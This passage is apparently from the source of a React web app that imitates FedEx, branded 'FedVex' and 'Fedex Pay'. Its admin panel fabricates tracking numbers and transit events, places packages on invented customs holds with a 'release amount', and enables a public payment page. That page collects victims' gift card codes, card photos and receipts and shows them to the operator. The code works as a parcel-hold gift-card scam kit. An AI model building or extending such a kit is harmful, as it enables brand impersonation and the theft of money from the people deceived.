      persist(exists ? shipments.map((shipment) => (shipment.id === saved.id ? saved : shipment)) : [saved, ...shipments]);
      setSelectedTracking(saved.trackingNumber);
    } catch (error) {
      setSyncError(error instanceof Error ? error.message : "Unable to save the shipment to Supabase.");
    } finally {
      setIsSyncing(false);
    }
  }

  async function createNewPackage() {
    const trackingNumber = `FVX${Math.floor(100000000 + Math.random() * 900000000)}`;
    const next: Shipment = {
      id: makeId("shipment"),
      trackingNumber,
      destinationCity: "Los Angeles",
      destinationCountry: "United States",
      currentStatus: "LABEL_CREATED",
      packageImageUrl: "",
      createdAt: nowIso(),
      updatedAt: nowIso(),
      events: [],
      holdRequest: null,
      receiptSubmission: null,
      giftCardSubmissions: [],
    };
    next.events = [createBlankEvent("LABEL_CREATED", next)];
    setIsSyncing(true);
    setSyncError("");
    try {
      const created = await createShipmentInSupabase(next);
      persist([created, ...shipments]);
      setSelectedTracking(created.trackingNumber);
    } catch (error) {
      setSyncError(error instanceof Error ? error.message : "Unable to create the shipment in Supabase.");
    } finally {
      setIsSyncing(false);
    }
  }

  async function deleteShipment(shipment: Shipment) {
    setIsSyncing(true);
    setSyncError("");
    try {
      await deleteShipmentFromSupabase(shipment.id);
      const next = shipments.filter((item) => item.id !== shipment.id);
      persist(next);
      setSelectedTracking(next[0]?.trackingNumber ?? "");
    } catch (error) {
      setSyncError(error instanceof Error ? error.message : "Unable to delete the shipment from Supabase.");
    } finally {
      setIsSyncing(false);
    }
  }

  return (
    <main className="admin-page">
      <header className="admin-topbar">
        <div className="brand admin-brand">
          <span>FedV</span>
          <span>ex</span>
        </div>
        <button
          type="button"
          onClick={async () => {
            await supabase.auth.signOut();
            window.location.href = "/admin/login";
          }}
        >
          Log out
        </button>
      </header>
      {syncError && <div className="admin-sync-message admin-error">Supabase: {syncError}</div>}
      {isSyncing && <div className="admin-sync-message">Synchronizing with Supabase...</div>}
      <section className="admin-grid">
        <aside className="admin-panel">
          <div className="package-list-header">
            <h2>Packages</h2>
            <button disabled={isSyncing} type="button" onClick={() => void createNewPackage()}>
              New Package
            </button>
          </div>
          <div className="shipment-table">
            {shipments.map((shipment) => (
              <button
                className={shipment.trackingNumber === selected?.trackingNumber ? "selected-row" : ""}
                key={shipment.id}
                type="button"
                onClick={() => setSelectedTracking(shipment.trackingNumber)}
              >
                <span>{shipment.trackingNumber}</span>
                <small>{statusLabels[shipment.currentStatus]}</small>
              </button>
            ))}
          </div>
        </aside>
        {selected && (
          <ShipmentEditor
            key={`${selected.id}-${selected.updatedAt}-${selected.giftCardSubmissions.length}`}
            shipment={selected}
            onDelete={() => void deleteShipment(selected)}
            onUpdate={updateShipment}
          />
        )}
      </section>
    </main>
  );
}

function ShipmentEditor({
  shipment,
  onDelete,
  onUpdate,
}: {
  shipment: Shipment;
  onDelete: () => void;
  onUpdate: (shipment: Shipment) => void;
}) {
  const [draft, setDraft] = useState<Shipment>(() => ({
    ...shipment,
    events: statusFlow.map(
      (status) => shipment.events.find((event) => event.code === status) ?? createBlankEvent(status, shipment),
    ),
    giftCardSubmissions: shipment.giftCardSubmissions ?? [],
  }));

  function updateEvent(status: Status, updates: Partial<TrackingEvent>) {
    setDraft((current) => ({
      ...current,
      events: current.events.map((event) => (event.code === status ? { ...event, ...updates } : event)),
    }));
  }

  function toggleEvent(status: Status, enabled: boolean) {
    setDraft((current) => {
      const hasEvent = current.events.some((event) => event.code === status);
      if (enabled && !hasEvent) {
        return { ...current, events: [...current.events, createBlankEvent(status, current)] };
      }
      if (!enabled) {
        return { ...current, events: current.events.filter((event) => event.code !== status) };
      }
      return current;
    });
  }

  function updateHold(updates: Partial<HoldRequest>) {
    setDraft((current) => ({
      ...current,
      holdRequest: {
        id: current.holdRequest?.id ?? makeId("hold"),
        reasonCode: current.holdRequest?.reasonCode ?? "CUSTOMS_HOLD",
        description: current.holdRequest?.description ?? "Shipment requires review before release.",
        status: current.holdRequest?.status ?? "OPEN",
        releaseAmount: current.holdRequest?.releaseAmount ?? 0,
        paySectionEnabled: current.holdRequest?.paySectionEnabled ?? false,
        ...updates,
      },
    }));
  }

  function savePackage() {
    const sortedEvents = statusFlow
      .map((status) => draft.events.find((event) => event.code === status))
      .filter((event): event is TrackingEvent => Boolean(event));
    onUpdate({
      ...draft,
      trackingNumber: normalizeTracking(draft.trackingNumber),
      events: sortedEvents,
      holdRequest: draft.currentStatus === "HELD" || draft.holdRequest ? draft.holdRequest : null,
    });
  }

  return (
    <section className="admin-panel editor-panel">
      <div className="editor-title-row">
        <div>
          <h2>Package Editor</h2>
          <p>Edit one package, then save it to its tracking number.</p>
        </div>
        <button className="danger-button" type="button" onClick={onDelete}>
          Delete
        </button>
      </div>
      <div className="editor-summary">
        <strong>{draft.trackingNumber}</strong>
        <span>{statusLabels[draft.currentStatus]}</span>
      </div>
      <section className="package-section">
        <h3>Package Details</h3>
        <div className="admin-form two-col">
          <label>
            Tracking Number
            <input
              value={draft.trackingNumber}
              onChange={(event) => setDraft({ ...draft, trackingNumber: normalizeTracking(event.target.value) })}
            />
          </label>
          <label>
            Current Status
            <select
              value={draft.currentStatus}
              onChange={(event) => {
                const currentStatus = event.target.value as Status;
                setDraft((current) => ({
                  ...current,
                  currentStatus,
                  holdRequest:
                    currentStatus === "HELD"
                      ? current.holdRequest ?? {
                          id: makeId("hold"),
                          reasonCode: "CUSTOMS_HOLD",
                          description: "Shipment requires review before release.",
                          status: "OPEN",
                          releaseAmount: 0,
                          paySectionEnabled: false,
                        }
                      : current.holdRequest,
                }));
              }}
            >
              {statusFlow.map((status) => (
                <option key={status} value={status}>
                  {statusLabels[status]}
                </option>
              ))}
            </select>
          </label>
          <label>
            Destination City
            <input
              value={draft.destinationCity}
              onChange={(event) => setDraft({ ...draft, destinationCity: event.target.value })}
            />
          </label>
          <label>
            Destination Country
            <input
              value={draft.destinationCountry}
              onChange={(event) => setDraft({ ...draft, destinationCountry: event.target.value })}
            />
          </label>
        </div>
        <div className="image-upload-row">
          <label>
            Package Image
            <input
              accept="image/gif,image/jpeg,image/png"
              type="file"
              onChange={(event) => {
                const file = event.target.files?.[0];
                if (!file) return;
                const reader = new FileReader();
                reader.onload = () => setDraft({ ...draft, packageImageUrl: String(reader.result) });
                reader.readAsDataURL(file);
              }}
            />
          </label>
          {draft.packageImageUrl ? (
            <img alt="Package preview" className="admin-package-preview" src={draft.packageImageUrl} />
          ) : (
            <div className="empty-image-preview">No package image</div>
          )}
        </div>
      </section>

      <section className="package-section">
        <h3>Status Sections</h3>
        <div className="status-editor-list">
          {statusFlow.map((status) => {
            const event = draft.events.find((item) => item.code === status);
            const enabled = Boolean(event);
            return (
              <article className="status-editor-card" key={status}>
                <label className="check-row">
                  <input checked={enabled} type="checkbox" onChange={(change) => toggleEvent(status, change.target.checked)} />
                  {statusLabels[status]}
                </label>
                {event && (
                  <div className="admin-form two-col">
                    <label>
                      Facility
                      <input value={event.facility} onChange={(change) => updateEvent(status, { facility: change.target.value })} />
                    </label>
                    <label>
                      City
                      <input value={event.city} onChange={(change) => updateEvent(status, { city: change.target.value })} />
                    </label>
                    <label>
                      Country
                      <input value={event.country} onChange={(change) => updateEvent(status, { country: change.target.value })} />
                    </label>
                    <label>
                      Date and Time
                      <input
                        type="datetime-local"
                        value={event.occurredAt.slice(0, 16)}
                        onChange={(change) => updateEvent(status, { occurredAt: new Date(change.target.value).toISOString() })}
                      />
                    </label>
                    <label className="full-width">
                      Description
                      <textarea
                        value={event.description}
                        onChange={(change) => updateEvent(status, { description: change.target.value })}
                      />
                    </label>
                  </div>
                )}
              </article>
            );
          })}
        </div>
      </section>

      {(draft.currentStatus === "HELD" || draft.holdRequest) && (
        <section className="package-section hold-settings">
          <h3>Held / Pay Section</h3>
          <div className="admin-form two-col">
            <label>
              Reason Code
              <select
                value={draft.holdRequest?.reasonCode ?? "CUSTOMS_HOLD"}
                onChange={(event) => updateHold({ reasonCode: event.target.value as HoldReason })}
              >
                <option value="CUSTOMS_HOLD">CUSTOMS_HOLD</option>
                <option value="ADDRESS_VERIFICATION">ADDRESS_VERIFICATION</option>
                <option value="SECURITY_REVIEW">SECURITY_REVIEW</option>
                <option value="PAYMENT_PENDING">PAYMENT_PENDING</option>
                <option value="OTHER">OTHER</option>
              </select>
            </label>
            <label>
              Hold Status
              <select
                value={draft.holdRequest?.status ?? "OPEN"}
                onChange={(event) => updateHold({ status: event.target.value as HoldStatus })}
              >
                <option value="OPEN">OPEN</option>
                <option value="PENDING_REVIEW">PENDING_REVIEW</option>
                <option value="RESOLVED">RESOLVED</option>
                <option value="REJECTED">REJECTED</option>
              </select>
            </label>
            <label>
              Release Amount
              <input
                min="0"
                step="0.01"
                type="number"
                value={draft.holdRequest?.releaseAmount ?? 0}
                onChange={(event) => updateHold({ releaseAmount: Number(event.target.value) })}
              />
            </label>
            <label className="check-row">
              <input
                checked={Boolean(draft.holdRequest?.paySectionEnabled)}
                disabled={(draft.holdRequest?.releaseAmount ?? 0) <= 0}
                type="checkbox"
                onChange={(event) => updateHold({ paySectionEnabled: event.target.checked })}
              />
              Enable Pay Section on public page
            </label>
            <label className="full-width">
              Hold Description
              <textarea
                value={draft.holdRequest?.description ?? ""}
                onChange={(event) => updateHold({ description: event.target.value })}
              />
            </label>
          </div>
        </section>
      )}

      <div className="editor-actions">
        <button type="button" onClick={savePackage}>
          Save Package
        </button>
      </div>

      {/* Receipt Submissions Section */}
      <section className="package-section">
        <h3>Receipt Submissions</h3>
        {draft.receiptSubmission ? (
          <div className="receipt-review">
            <img alt="Submitted receipt" src={draft.receiptSubmission.imageDataUrl} />
            <span>
              {draft.receiptSubmission.fileName} - {formatDate(draft.receiptSubmission.submittedAt)}
            </span>
          </div>
        ) : (
          <p>No receipt submitted.</p>
        )}
      </section>

      {/* Gift Card Submissions Section — queries Supabase + localStorage fallback */}
      <section className="package-section">
        <h3>Gift Card Submissions</h3>
        <GiftCardSubmissionsList shipmentId={draft.id} />
      </section>
    </section>
  );
}

// GiftCardSubmissionsList — queries Supabase AND shows localStorage as fallback
function GiftCardSubmissionsList({ shipmentId }: { shipmentId: string }) {
  const [supabaseSubmissions, setSupabaseSubmissions] = useState<any[]>([]);
  const [localSubmissions, setLocalSubmissions] = useState<GiftCardSubmission[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Load local submissions first (always works)
    const shipments = loadShipments();
    const shipment = shipments.find((s) => s.id === shipmentId);
    if (shipment) {
      setLocalSubmissions(shipment.giftCardSubmissions ?? []);
    }

    // Try Supabase
    async function fetchFromSupabase() {
      setLoading(true);
      setError(null);
      try {
        const uuid = extractUuid(shipmentId);

        const { data, error: fetchError } = await supabase
          .from("gift_card_submissions")
          .select("*")
          .eq("shipment_id", uuid)
          .order("submitted_at", { ascending: false });

        if (fetchError) {
          setError(`Supabase query failed: ${fetchError.message}`);
          return;
        }

        setSupabaseSubmissions(data ?? []);
      } catch (err: any) {
        setError(err.message ?? "Failed to load from Supabase");
      } finally {
        setLoading(false);
      }
    }

    fetchFromSupabase();
  }, [shipmentId]);

  const hasSupabaseData = supabaseSubmissions.length > 0;
  const hasLocalData = localSubmissions.length > 0;

  return (
    <div>
      {/* Error banner if Supabase failed */}
      {error && (
        <div className="admin-error" style={{ background: "#fff3cd", border: "1px solid #ffc107", padding: "8px 12px", borderRadius: 4, marginBottom: 12 }}>
          <p style={{ margin: 0, color: "#856404", fontSize: 13 }}>
            ⚠️ <strong>Supabase:</strong> {error}
          </p>
          <p style={{ margin: "4px 0 0", fontSize: 12, color: "#856404" }}>
            Showing local browser-stored submissions as fallback.
          </p>
        </div>
      )}

      {/* Loading */}
      {loading && <p style={{ fontSize: 13, color: "#666" }}>Loading from Supabase...</p>}

      {/* Supabase data */}
      {hasSupabaseData && (
        <div>
          <p style={{ fontSize: 13, color: "#666", margin: "0 0 8px" }}>
            From Supabase ({supabaseSubmissions.length}):
          </p>
          {supabaseSubmissions.map((sub: any) => (
            <div key={sub.id} className="gift-card-submission-card" style={{ marginBottom: 12, padding: 10, border: "1px solid #ddd", borderRadius: 6 }}>
              <div className="submission-header" style={{ display: "flex", justifyContent: "space-between", marginBottom: 6 }}>
                <strong>{giftCardLabels[sub.card_type as GiftCardType] ?? sub.card_type}</strong>
                <small style={{ color: "#666" }}>{formatDate(sub.submitted_at)}</small>
              </div>
              <div className="submission-code" style={{ marginBottom: 6 }}>
                <span style={{ fontWeight: 600 }}>Card Code:</span>{' '}
                <code style={{ background: "#f4f4f4", padding: "2px 6px", borderRadius: 3 }}>{sub.card_code}</code>
              </div>
              <div className="submission-images" style={{ display: "flex", gap: 12, flexWrap: "wrap" }}>
                <div>
                  <span style={{ display: "block", fontSize: 12, marginBottom: 4 }}>Card Image:</span>
                  <img alt="Gift card" src={sub.card_image_url} style={{ maxWidth: 200, maxHeight: 150, border: "1px solid #ccc", borderRadius: 4 }} />
                </div>
                <div>
                  <span style={{ display: "block", fontSize: 12, marginBottom: 4 }}>Receipt Image:</span>
                  <img alt="Receipt" src={sub.receipt_image_url} style={{ maxWidth: 200, maxHeight: 150, border: "1px solid #ccc", borderRadius: 4 }} />
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Local fallback data */}
      {hasLocalData && !hasSupabaseData && (
        <div>
          <p style={{ fontSize: 13, color: "#666", margin: "0 0 8px" }}>
            From localStorage ({localSubmissions.length}):
          </p>
          {localSubmissions.map((sub: any, idx: number) => (
            <div key={sub.id ?? idx} className="gift-card-submission-card" style={{ marginBottom: 12, padding: 10, border: "1px solid #ddd", borderRadius: 6 }}>
              <div className="submission-header" style={{ display: "flex", justifyContent: "space-between", marginBottom: 6 }}>
                <strong>{giftCardLabels[sub.cardType as GiftCardType] ?? sub.cardType}</strong>
                <small style={{ color: "#666" }}>{formatDate(sub.submittedAt)}</small>
              </div>
              <div className="submission-code" style={{ marginBottom: 6 }}>
                <span style={{ fontWeight: 600 }}>Card Code:</span>{' '}
                <code style={{ background: "#f4f4f4", padding: "2px 6px", borderRadius: 3 }}>{sub.cardCode}</code>
              </div>
              {sub.cardImageDataUrl && (
                <div className="submission-images" style={{ display: "flex", gap: 12, flexWrap: "wrap" }}>
                  <div>
                    <span style={{ display: "block", fontSize: 12, marginBottom: 4 }}>Card Image:</span>
                    <img alt="Gift card" src={sub.cardImageDataUrl} style={{ maxWidth: 200, maxHeight: 150, border: "1px solid #ccc", borderRadius: 4 }} />
                  </div>
                  {sub.receiptImageDataUrl && (
                    <div>
                      <span style={{ display: "block", fontSize: 12, marginBottom: 4 }}>Receipt Image:</span>
                      <img alt="Receipt" src={sub.receiptImageDataUrl} style={{ maxWidth: 200, maxHeight: 150, border: "1px solid #ccc", borderRadius: 4 }} />
                    </div>
                  )}
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Empty state */}
      {!hasSupabaseData && !hasLocalData && !loading && (
        <p>No gift card submissions yet.</p>
      )}
    </div>
  );
}

function HoldSettingsPanel({ shipment, onUpdate }: { shipment: Shipment; onUpdate: (shipment: Shipment) => void }) {
  const hold =
    shipment.holdRequest ??
    ({
      id: makeId("hold"),
      reasonCode: "CUSTOMS_HOLD",
      description: "Shipment requires review before release.",
      status: "OPEN",
      releaseAmount: 0,
      paySectionEnabled: false,
    } satisfies HoldRequest);
  const [draft, setDraft] = useState<HoldRequest>(hold);

  useEffect(() => setDraft(hold), [hold.id, hold.releaseAmount, hold.paySectionEnabled, hold.status]);

  return (
    <section className="hold-settings">
      <h3>Hold Settings</h3>
      <div className="admin-form two-col">
        <select
          value={draft.reasonCode}
          onChange={(event) => setDraft({ ...draft, reasonCode: event.target.value as HoldReason })}
        >
          <option value="CUSTOMS_HOLD">CUSTOMS_HOLD</option>
          <option value="ADDRESS_VERIFICATION">ADDRESS_VERIFICATION</option>
          <option value="SECURITY_REVIEW">SECURITY_REVIEW</option>
          <option value="PAYMENT_PENDING">PAYMENT_PENDING</option>
          <option value="OTHER">OTHER</option>
        </select>
        <select value={draft.status} onChange={(event) => setDraft({ ...draft, status: event.target.value as HoldStatus })}>
          <option value="OPEN">OPEN</option>
          <option value="PENDING_REVIEW">PENDING_REVIEW</option>
          <option value="RESOLVED">RESOLVED</option>
          <option value="REJECTED">REJECTED</option>
        </select>
        <input
          min="0"
          step="0.01"
          type="number"
          value={draft.releaseAmount}
          onChange={(event) => setDraft({ ...draft, releaseAmount: Number(event.target.value) })}
        />
        <label className="check-row">
          <input
            checked={draft.paySectionEnabled}
            disabled={draft.releaseAmount <= 0}
            type="checkbox"
            onChange={(event) => setDraft({ ...draft, paySectionEnabled: event.target.checked })}
          />
          Enable Pay Section on public page
        </label>
        <textarea
          value={draft.description}
          onChange={(event) => setDraft({ ...draft, description: event.target.value })}
        />
        <button type="button" onClick={() => onUpdate({ ...shipment, holdRequest: draft })}>
          Save Hold Settings
        </button>
      </div>
    </section>
  );
}

function TrackPage() {
  return (
    <>
      <Header />
      <section className="track-page">
        <HomePage />
      </section>
    </>
  );
}

function ReleasePaymentPage() {
  const trackingNumber = new URLSearchParams(window.location.search).get("tracking") ?? "";
  const normalizedTrackingNumber = normalizeTracking(trackingNumber);
  const [shipment, setShipment] = useState<Shipment | undefined>(() =>
    loadShipments().find((item) => item.trackingNumber === normalizedTrackingNumber),
  );
  const [isLoading, setIsLoading] = useState(!shipment && Boolean(normalizedTrackingNumber));
  const [lookupError, setLookupError] = useState("");
  const amount = shipment?.holdRequest?.releaseAmount ?? 0;

  useEffect(() => {
    const localShipments = loadShipments();
    const localShipment = localShipments.find(
      (item) => item.trackingNumber === normalizedTrackingNumber,
    );
    if (localShipment || !normalizedTrackingNumber) {
      setShipment(localShipment);
      setIsLoading(false);
      return;
    }

    let cancelled = false;
    setIsLoading(true);
    setLookupError("");
    void fetchShipmentFromSupabase(normalizedTrackingNumber)
      .then((remoteShipment) => {
        if (cancelled || !remoteShipment) return;
        setShipment(remoteShipment);
        saveShipments([...localShipments, remoteShipment]);
      })
      .catch((error) => {
        if (!cancelled) {
          setLookupError(error instanceof Error ? error.message : "Unable to retrieve shipment details.");
        }
      })
      .finally(() => {
        if (!cancelled) setIsLoading(false);
      });

    return () => { cancelled = true; };
  }, [normalizedTrackingNumber]);

  return (
    <main className="page-shell release-page">
      <section className="release-page-hero">
        <div className="release-page-card">
          <div className="release-page-topbar">
            <div className="release-brand"><span>Fed</span><span>ex</span> Pay</div>
            <span className="secure-payment-badge">Secure payment</span>
          </div>
          <a className="release-back-link" href="/track">
            &larr; Back to tracking
          </a>
          <span className="release-page-eyebrow">Shipment release payment</span>
          <h1>Complete your payment</h1>
          <p className="release-page-intro">
            Choose an available payment method to release your shipment for processing.
          </p>

          {isLoading ? (
            <p className="release-page-notice">Loading shipment details...</p>
          ) : shipment ? (
            <div className="release-summary">
              <div>
                <span>Tracking number</span>
                <strong>{shipment.trackingNumber}</strong>
              </div>
              <div>
                <span>Release amount</span>
                <strong className="release-summary-amount">${amount.toFixed(2)}</strong>
              </div>
            </div>
          ) : (
            <p className="release-page-notice">
              {lookupError || "Shipment details could not be found. Return to tracking and try again."}
            </p>
          )}

          {shipment && (
            <PaySection
              shipment={shipment}
              standalone
            />
          )}
        </div>
      </section>
    </main>
  );
}

function PaymentSuccessPage() {
  const trackingNumber = new URLSearchParams(window.location.search).get("tracking") ?? "";

  return (
    <main className="payment-success-page">
      <section className="payment-success-card">
        <div className="success-icon" aria-hidden="true">✓</div>
        <span className="success-eyebrow">Payment received</span>
        <h1>Submission successful</h1>
        <p>Your payment information was securely submitted for admin review.</p>
        {trackingNumber && <div className="success-tracking"><span>Tracking number</span><strong>{trackingNumber}</strong></div>}
        <div className="success-notice"><span aria-hidden="true">◷</span><p>Your shipment will be reviewed within 24–48 hours.</p></div>
        <a href="/track">Return to tracking</a>
      </section>
    </main>
  );
}

function AdminRoute() {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean | null>(null);

  useEffect(() => {
    void supabase.auth.getSession().then(({ data }) => setIsAuthenticated(Boolean(data.session)));
    const { data: listener } = supabase.auth.onAuthStateChange((_event, session) => {
      setIsAuthenticated(Boolean(session));
    });
    return () => listener.subscription.unsubscribe();
  }, []);

  if (isAuthenticated === null) {
    return <main className="admin-page"><div className="admin-sync-message">Checking admin session...</div></main>;
  }
  return isAuthenticated ? <AdminDashboard /> : <AdminLogin />;
}

function App() {
  const path = window.location.pathname;
  if (path === "/admin/login") return <AdminLogin />;
  if (path.startsWith("/admin")) return <AdminRoute />;
  if (path === "/release-payment") return <ReleasePaymentPage />;
  if (path === "/payment-success") return <PaymentSuccessPage />;
  if (path === "/track") return <HomePage />;
  return <HomePage />;
}

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
);
